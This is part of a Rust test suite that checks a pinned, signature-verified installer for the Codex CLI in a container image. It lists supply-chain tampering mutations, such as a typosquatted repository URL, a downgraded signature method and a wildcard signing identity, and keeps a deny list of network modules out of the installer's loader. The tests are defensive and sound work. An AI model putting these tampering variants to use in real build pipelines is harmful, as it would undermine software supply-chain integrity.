        "CODEX_NON_INTERACTIVE=1",
        "unset CODEX_INSTALL_DEFER_SELECTION",
    ] {
        if !hook.contains(required) {
            return Err(format!("install-codex.sh must contain `{required}`"));
        }
    }
    let check_at = hook
        .find("codex_pin.py\" check --pin-dir")
        .ok_or("install-codex.sh must run the pin check")?;
    let vendor_at = hook
        .find("sh \"$VENDOR/install.sh\"")
        .ok_or("install-codex.sh must run the vendored installer")?;
    if check_at > vendor_at {
        return Err("install-codex.sh must check the pin before invoking the vendor".into());
    }
    for forbidden in ["latest", "expected_digest=", "EXPECTED_HASH", "SHA256SUMS"] {
        if hook_code.contains(forbidden) {
            return Err(format!(
                "install-codex.sh must not decide by `{forbidden}`: the pin is the only input"
            ));
        }
    }
    for required in [
        "def load_pin(",
        "def select(",
        "def require_elf(",
        "def preflight_archive(",
        "MAX_DECODED_BYTES",
        "MAX_EXTENDED_HEADER_BYTES",
    ] {
        if !loader.contains(required) {
            return Err(format!("codex_pin.py must contain `{required}`"));
        }
    }
    for forbidden in ["urllib", "requests", "socket", "subprocess", "verify-blob"] {
        if loader.contains(forbidden) {
            return Err(format!(
                "codex_pin.py must stay offline and non-cryptographic: found `{forbidden}`"
            ));
        }
    }
    Ok(())
}

#[test]
fn codex_pin_selects_both_reviewed_payloads() {
    let pin = parse_codex_pin(&read_text(CODEX_PIN)).expect("the committed pin parses");
    assert_eq!(pin.release, "rust-v0.159.3");
    assert_eq!(pin.version, "0.159.3");
    assert_eq!(
        pin.platforms
            .keys()
            .map(String::as_str)
            .collect::<Vec<&str>>(),
        vec!["linux/amd64", "linux/arm64"]
    );
    for (platform, target) in CODEX_TARGETS {
        let entry = &pin.platforms[platform];
        assert_eq!(entry.target, target);
        assert_eq!(entry.asset, format!("codex-package-{target}.tar.gz"));
        assert_eq!(
            entry.url,
            format!(
                "https://github.com/openai/codex/releases/download/rust-v0.159.3/{}",
                entry.asset
            )
        );
        assert!(is_lower_hex(&entry.digest, 64), "{platform}");
        assert_eq!(
            entry.bundle.path,
            format!("evidence/codex-package-{target}.tar.gz.sigstore")
        );
        assert!(is_lower_hex(&entry.bundle.digest, 64), "{platform} bundle");
    }
    assert_eq!(pin.authentication.verifier_version, CODEX_VERIFIER_VERSION);
    assert_eq!(
        pin.authentication.identity,
        format!("{CODEX_WORKFLOW}@refs/tags/rust-v0.159.3")
    );
    // Direct presence assertions: the generic helper inventory is a known
    // separate defect (#116), so this does not lean on it.
    for relative in [CODEX_PIN, CODEX_HOOK, CODEX_LOADER] {
        let path = repo_path(relative);
        assert!(path.is_file(), "{relative} must exist");
        assert!(
            !path.symlink_metadata().unwrap().file_type().is_symlink(),
            "{relative} must be a regular file, not a symlink"
        );
    }
    for evidence in [&pin.metadata, &pin.checksums]
        .into_iter()
        .chain(pin.platforms.values().map(|entry| &entry.bundle))
    {
        let path = repo_path(&format!("images/tools/codex/{}", evidence.path));
        assert!(path.is_file(), "{} must exist", evidence.path);
        assert!(
            !path.symlink_metadata().unwrap().file_type().is_symlink(),
            "{} must be a regular file, not a symlink",
            evidence.path
        );
    }
    let recipe = standard_dockerfile();
    check_codex_recipe(&recipe, &pin).expect("the committed recipe is wired to the pin");
    check_codex_helper_sources(&read_text(CODEX_HOOK), &read_text(CODEX_LOADER))
        .expect("the hook and loader keep the pin authority");
}

#[test]
fn codex_pin_mutations_are_refused() {
    let source = read_text(CODEX_PIN);
    let pin = parse_codex_pin(&source).expect("the committed pin parses");
    let baseline: Value = serde_json::from_str(&source).expect("the pin is JSON");
    type Mutation = Box<dyn Fn(&mut Value)>;
    let mutations: Vec<(&str, Mutation)> = vec![
        (
            "schema as a string",
            Box::new(|pin| pin["schema"] = Value::String("1".into())),
        ),
        (
            "schema as a boolean",
            Box::new(|pin| pin["schema"] = Value::Bool(true)),
        ),
        (
            "unknown kind",
            Box::new(|pin| pin["kind"] = Value::String("release-archive".into())),
        ),
        (
            "unknown name",
            Box::new(|pin| pin["name"] = Value::String("gh".into())),
        ),
        (
            "release disagrees with version",
            Box::new(|pin| pin["release"] = Value::String("rust-v0.159.4".into())),
        ),
        (
            "floating version",
            Box::new(|pin| pin["version"] = Value::String("0.159".into())),
        ),
        (
            "leading-zero pre-release identifier",
            Box::new(|pin| {
                pin["release"] = Value::String("rust-v0.159.3-alpha.01".into());
                pin["version"] = Value::String("0.159.3-alpha.01".into());
            }),
        ),
        (
            "missing platform",
            Box::new(|pin| {
                pin["platforms"]
                    .as_object_mut()
                    .unwrap()
                    .remove("linux/arm64");
            }),
        ),
        (
            "extra platform",
            Box::new(|pin| {
                pin["platforms"]["linux/armv7"] = pin["platforms"]["linux/arm64"].clone();
            }),
        ),
        (
            "wrong target for the platform",
            Box::new(|pin| {
                pin["platforms"]["linux/amd64"]["target"] =
                    Value::String("aarch64-unknown-linux-musl".into());
            }),
        ),
        (
            "wrong asset for the target",
            Box::new(|pin| {
                pin["platforms"]["linux/amd64"]["asset"] =
                    Value::String("codex-package-other.tar.gz".into());
            }),
        ),
        (
            "url with an extra path segment",
            Box::new(|pin| {
                let url = pin["platforms"]["linux/amd64"]["url"].as_str().unwrap();
                pin["platforms"]["linux/amd64"]["url"] =
                    Value::String(url.replace("/download/", "/download/extra/"));
            }),
        ),
        (
            "url on another repository",
            Box::new(|pin| {
                let url = pin["platforms"]["linux/amd64"]["url"].as_str().unwrap();
                pin["platforms"]["linux/amd64"]["url"] =
                    Value::String(url.replace("openai/codex", "openai/codexx"));
            }),
        ),
        (
            "metadata url carrying a query",
            Box::new(|pin| {
                let url = pin["metadata"]["url"].as_str().unwrap();
                pin["metadata"]["url"] = Value::String(format!("{url}?x=1"));
            }),
        ),
        (
            "uppercase digest",
            Box::new(|pin| {
                let digest = pin["platforms"]["linux/amd64"]["sha256"].as_str().unwrap();
                pin["platforms"]["linux/amd64"]["sha256"] = Value::String(digest.to_uppercase());
            }),
        ),
        (
            "bundle for the other architecture",
            Box::new(|pin| {
                let other = pin["platforms"]["linux/arm64"]["bundle"].clone();
                pin["platforms"]["linux/amd64"]["bundle"] = other;
            }),
        ),
        (
            "signature method downgraded",
            Box::new(|pin| {
                pin["authentication"]["method"] = Value::String("hash-only".into());
            }),
        ),
        (
            "permissive verifier version",
            Box::new(|pin| {
                pin["authentication"]["verifier"]["version"] = Value::String("latest".into());
            }),
        ),
        (
            "identity regexp instead of an exact workflow",
            Box::new(|pin| {
                pin["authentication"]["certificate_identity"] = Value::String(".*".into());
            }),
        ),
        (
            "wrong issuer",
            Box::new(|pin| {
                pin["authentication"]["certificate_oidc_issuer"] =
                    Value::String("https://accounts.google.com".into());
            }),
        ),
        (
            "untrusted root",
            Box::new(|pin| {
                pin["authentication"]["trust_root"] = Value::String("local".into());
            }),
        ),
        (
            "verified_on is not a date",
            Box::new(|pin| {
                pin["authentication"]["verified_on"] = Value::String("today".into());
            }),
        ),
        (
            "entrypoint changed",
            Box::new(|pin| pin["package"]["entrypoint"] = Value::String("codex".into())),
        ),
        (
            "layout version widened",
            Box::new(|pin| pin["package"]["layout_version"] = Value::Number(2.into())),
        ),
        (
            "unknown field",
            Box::new(|pin| pin["install"] = Value::String("/usr/local".into())),
        ),
    ];
    for (label, mutate) in mutations {
        let mut mutated = baseline.clone();
        mutate(&mut mutated);
        let text = serde_json::to_string(&mutated).unwrap();
        assert!(
            parse_codex_pin(&text).is_err(),
            "the gate accepted a pin with: {label}"
        );
    }
    assert_eq!(parse_codex_pin(&source).unwrap(), pin);
}

#[test]
fn codex_recipe_requires_readonly_pin_source() {
    let pin = parse_codex_pin(&read_text(CODEX_PIN)).expect("the committed pin parses");
    let recipe = standard_dockerfile();
    check_codex_recipe(&recipe, &pin).unwrap();
    let mutations = [
        recipe.replace(CODEX_SOURCE_MOUNT, "--mount=type=bind,source=missing,ro"),
        recipe.replace(CODEX_SOURCE_MOUNT, ""),
        recipe.replace(
            CODEX_SOURCE_MOUNT,
            &CODEX_SOURCE_MOUNT.replace(",ro", ",rw"),
        ),
        recipe.replace(CODEX_SOURCE_ENV, "AGENT_VM_CODEX_SOURCE_DIR=/elsewhere"),
        recipe.replace(CODEX_SOURCE_ENV, ""),
        recipe.replace(
            CODEX_SOURCE_ENV,
            "AGENT_VM_CODEX_SOURCE_DIR=/tmp/codex-source\n    AGENT_VM_CODEX_DIGEST=0000",
        ),
        recipe.replace(CODEX_VENDOR_MOUNT, ""),
        recipe.replace(CODEX_HOOK_MOUNT, ""),
        mutate_codex_block(
            &recipe,
            "AGENT_INSTALL_SOFT_FAIL= ",
            "AGENT_INSTALL_SOFT_FAIL=1 ",
        ),
        recipe.replace("sh /tmp/verify-codex.sh", "true"),
        recipe.replace(CODEX_RUN_INSTALL, "true"),
        recipe.replace(
            "LABEL org.agent-vm.version.codex=\"${AGENT_VERSION_CODEX}\"",
            "LABEL org.agent-vm.version.codex=\"rust-v0.159.3\"",
        ),
        recipe.replace(
            "ARG AGENT_VERSION_CODEX=rust-v0.159.3",
            "ARG AGENT_VERSION_CODEX=latest",
        ),
    ];
    for (index, mutated) in mutations.into_iter().enumerate() {
        assert_ne!(mutated, recipe, "recipe mutation {index} changed nothing");
        assert!(
            check_codex_recipe(&mutated, &pin).is_err(),
            "the gate accepted codex recipe mutation {index}"
        );
    }
}

#[test]
fn codex_recipe_mutations_are_refused() {
    let hook = read_text(CODEX_HOOK);
    let loader = read_text(CODEX_LOADER);
    check_codex_helper_sources(&hook, &loader).unwrap();
    let hook_mutations = [
        hook.replace("codex_pin.py\" check --pin-dir", "true #"),
        hook.replace("AGENT_VM_CODEX_SOURCE_DIR", "CODEX_OTHER_DIR"),
        hook.replace("unset CODEX_INSTALL_DEFER_SELECTION", ":"),
        hook.replace("CODEX_INSTALL_DAEMON_ONLY=0", "CODEX_INSTALL_DAEMON_ONLY=1"),
        format!("{hook}\nprintf 'latest' >&2\n"),
        format!("{hook}\nexpected_digest=0000\n"),
    ];
    for (index, mutated) in hook_mutations.into_iter().enumerate() {
        assert_ne!(mutated, hook, "hook mutation {index} changed nothing");
        assert!(
            check_codex_helper_sources(&mutated, &loader).is_err(),
            "the gate accepted hook mutation {index}"
        );
    }
    // The pin check must precede the vendor call: swapping them is the defect.
    let check = "python3 \"$pin_dir/codex_pin.py\" check --pin-dir \"$pin_dir\" --release \"$version\" || {";
    let vendor = "sh \"$VENDOR/install.sh\" || rc=$?";
    assert!(hook.contains(check) && hook.contains(vendor));
    let reordered = hook
        .replace(check, "@@CHECK@@")
        .replace(vendor, check)
        .replace("@@CHECK@@", vendor);
    assert_ne!(reordered, hook);
    assert!(
        check_codex_helper_sources(&reordered, &loader).is_err(),
        "the gate accepted a vendor call before the pin check"
    );
    let loader_mutations = [
        loader.replace("def load_pin(", "def load_pin_disabled("),
        format!("{loader}\nimport urllib.request\n"),
        format!("{loader}\nimport subprocess\n"),
        format!("{loader}\n# verify-blob\n"),
        loader.replace("MAX_DECODED_BYTES", "DECODED_LIMIT"),
    ];
    for (index, mutated) in loader_mutations.into_iter().enumerate() {
        assert_ne!(mutated, loader, "loader mutation {index} changed nothing");
        assert!(
            check_codex_helper_sources(&hook, &mutated).is_err(),
            "the gate accepted loader mutation {index}"
        );
    }
}
